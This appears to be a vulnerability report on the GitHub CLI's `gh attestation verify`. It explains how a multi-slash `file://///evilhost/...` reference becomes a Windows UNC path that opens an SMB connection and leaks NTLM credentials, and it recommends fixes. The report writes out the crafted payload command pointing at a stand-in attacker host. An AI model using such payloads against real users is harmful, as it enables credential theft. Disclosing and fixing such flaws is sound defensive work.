### Title
Multiple-leading-slash `file://` URIs can be normalized into a genuine UNC path on Windows, causing `digestLocalFileArtifact` to open a network SMB share and leak NTLM credentials - (File: pkg/cmd/attestation/artifact/artifact.go)

### Summary
`normalizeReference` derives the local path solely from `url.ParseRequestURI(reference).Path` and then, on Windows, converts every `/` to `\` and strips exactly one leading separator to remove the artifact of the URI's mandatory `/` after the authority. Because `url.ParseRequestURI` preserves multiple consecutive slashes verbatim in the `Path` field (it does not collapse them), an attacker who supplies a reference with enough leading slashes (e.g. `file://///evilhost/share/x`) can make the post-conversion, post-strip path start with exactly two backslashes, i.e. a well-formed UNC path `\\evilhost\share\x`. `os.Open` on that path in `digestLocalFileArtifact` (pkg/cmd/attestation/artifact/file.go) will then connect to the attacker-controlled SMB host and, on Windows, will attempt NTLM authentication, leaking the victim's NTLM hash/credentials.

### Finding Description
`normalizeReference` (pkg/cmd/attestation/artifact/artifact.go:30-55) handles `file://` references by parsing the URI with `url.ParseRequestURI` and using only `uri.Path` (the `Host`/authority component is discarded entirely): [1](#0-0) 

On Windows, `uri.Path` slashes are blanket-converted to backslashes, and then exactly one leading backslash is stripped off, presumably to undo the mandatory leading `/` that a URI path always carries: [2](#0-1) 

This one-character strip is only correct when `uri.Path` has exactly one leading slash (the normal `file:///C:/...` case, verified by the existing tests in `artifact_windows_test.go`). However, `url.ParseRequestURI` does not collapse repeated slashes in the path; supplying extra slashes after the authority separator (`file://` + additional `/`s) produces a `Path` with multiple leading slashes. For a reference with 3 leading slashes in the resulting `Path` (achieved with the literal string `file://///evilhost/share/x`, i.e. 5 slashes total after `file:`), the transform yields:
- `uri.Path` = `///evilhost/share/x`
- After slash→backslash replace: `\\\evilhost\share\x` (3 backslashes)
- After stripping one leading backslash: `\\evilhost\share\x` (2 backslashes) — a syntactically valid Windows UNC path.

`filepath.Clean` does not remove this two-backslash prefix (Windows UNC prefixes are preserved by `Clean`). The resulting string is then handed to `digestLocalFileArtifact`, which calls `os.Open(filename)` directly with no host/scheme validation: [3](#0-2) 

On Windows, `os.Open` on a `\\host\share\path` string is resolved by the OS as a network SMB path, triggering an outbound SMB connection and NTLM authentication handshake to the attacker-specified host, which can be used to capture/relay the victim's NTLM credentials. There is no allowlist, `safeurl`/`safepaths` check, or authority validation anywhere in this path — the code assumes `file://` references are always local and never inspects/rejects a resolved authority or "too many slashes" case.

### Impact Explanation
This is a credential-disclosure primitive: an attacker who can get a victim to run `gh attestation verify file://///evilhost/share/artifact` (e.g., via a copy-pasted command from a malicious README, release note, issue, or script) causes the Windows victim's machine to authenticate an SMB session to the attacker's host, leaking NTLM Net-NTLMv2 hashes that can be cracked or relayed. This matches GitHub's bounty impact class for credential/token exfiltration via crafted CLI input.

### Likelihood Explanation
Requires: (1) victim on Windows, (2) victim manually supplies/copy-pastes an attacker-crafted reference string containing an unusual (but syntactically valid and inconspicuous-looking) multi-slash `file://` URI, and (3) outbound SMB (port 445) reachable from the victim's network to the attacker host. The attacker does not need any privileges beyond publishing content the victim will copy — consistent with the threat model (malicious README/release/issue/script). Likelihood is moderate: it depends on social engineering to get the exact reference string used, and the multi-slash payload is somewhat conspicuous, but it requires no privileged access and no additional trust boundary crossing beyond what `gh attestation verify` already assumes for a "local file" reference.

### Recommendation
Do not derive the local filesystem path purely from `uri.Path` slash-counting. Instead:
1. Reject any `file://` reference whose parsed `url.URL.Host` is non-empty (this already indicates a non-local/UNC-style reference) and treat that as an error rather than silently discarding it.
2. Replace the "strip exactly one leading separator" heuristic with a check that rejects/normalizes paths that, after conversion, begin with two or more consecutive path separators (i.e., would form a UNC path), for example using `filepath.IsAbs` plus an explicit check against `filepath.VolumeName` beginning with `\\`.
3. After computing the final path, verify with `filepath.IsLocal` (Go 1.20+) or an equivalent explicit UNC-prefix check before passing it to `digestLocalFileArtifact`, and return an error if the path is a UNC/network path.
